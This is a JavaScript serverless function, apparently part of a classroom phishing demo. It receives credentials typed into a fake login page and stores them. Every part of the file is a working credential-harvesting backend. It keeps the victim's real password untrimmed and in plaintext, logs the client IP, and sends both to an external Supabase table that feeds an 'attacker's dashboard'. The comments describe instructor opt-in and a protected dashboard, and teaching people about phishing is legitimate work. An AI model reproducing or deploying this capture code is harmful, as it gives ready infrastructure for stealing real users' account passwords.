// Netlify Function — POST /api/capture
//
// Receives a submission from the static demo login page and stores it in the
// class Supabase project so the instructor has a live "attacker's dashboard"
// on the deployed site. The instructor opted into storing the real password
// (see login.js) for the full demo experience; the /password dashboard that
// reads these rows is protected by HTTP Basic Auth (DEMO_INSTRUCTOR_PASS).
//
// Env vars (set in Netlify): SUPABASE_URL, SUPABASE_ANON_KEY
exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  const supabaseUrl = process.env.SUPABASE_URL;
  const anonKey = process.env.SUPABASE_ANON_KEY;
  if (!supabaseUrl || !anonKey) {
    return { statusCode: 500, body: "capture backend not configured" };
  }

  let body;
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return { statusCode: 400, body: "invalid json" };
  }

  // Anti-bot marker, mirroring the local Flask build. Must match the
  // data-xrw attribute in login.html.
  if (body.xrw !== "demo-training-token-2026") {
    return { statusCode: 403, body: "forbidden" };
  }

  const clean = (v) => (typeof v === "string" ? v.trim().slice(0, 64) : "");
  const username = clean(body.username);
  if (username.length < 3) {
    return { statusCode: 400, body: "invalid username" };
  }

  // Real password (instructor opted in). Mirrors the Flask checks exactly:
  // 8-64 chars, no control characters. Passwords are NOT trimmed — leading /
  // trailing spaces are significant. Validate the RAW value and reject
  // oversized input (never truncate — a stored password must be exactly what
  // the victim typed).
  const password = typeof body.password === "string" ? body.password : "";
  if (
    password.length < 8 ||
    password.length > 64 ||
    [...password].some((c) => c.charCodeAt(0) < 32)
  ) {
    return { statusCode: 400, body: "invalid password" };
  }

  const ip = (event.headers["x-nf-client-connection-ip"] || "unknown").slice(0, 45);

  const payload = {
    username,
    password_masked: "********", // legacy column (kept NOT NULL in the schema)
    password,
    created_at:
      typeof body.time === "string" ? body.time.slice(0, 64) : new Date().toLocaleString(),
    ip,
  };

  try {
    const resp = await fetch(`${supabaseUrl}/rest/v1/captures`, {
      method: "POST",
      headers: {
        apikey: anonKey,
        Authorization: `Bearer ${anonKey}`,
        "Content-Type": "application/json",
        Prefer: "return=minimal",
      },
      body: JSON.stringify(payload),
    });
    if (!resp.ok) {
      return { statusCode: 502, body: "storage failed" };
    }
    return { statusCode: 201, body: "ok" };
  } catch {
    return { statusCode: 502, body: "storage unavailable" };
  }
};
